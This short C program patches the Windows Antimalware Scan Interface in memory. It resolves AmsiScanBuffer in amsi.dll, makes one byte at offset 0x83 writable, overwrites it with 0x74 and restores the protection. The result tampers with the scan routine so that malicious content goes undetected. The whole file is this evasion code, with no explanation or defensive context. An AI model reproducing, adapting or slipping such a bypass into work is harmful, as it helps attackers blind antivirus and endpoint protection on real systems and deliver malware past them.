#include <windows.h>

int main() {
	DWORD dwOld = 0;
	DWORD offset = 0x83;
	FARPROC ptrAmsiScanBuffer = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
	VirtualProtect(ptrAmsiScanBuffer + offset, 1, PAGE_EXECUTE_READWRITE, &dwOld);
	memcpy(ptrAmsiScanBuffer + offset, "\x74", 1);
	VirtualProtect(ptrAmsiScanBuffer + offset, 1, dwOld, &dwOld);
	return 0;
}
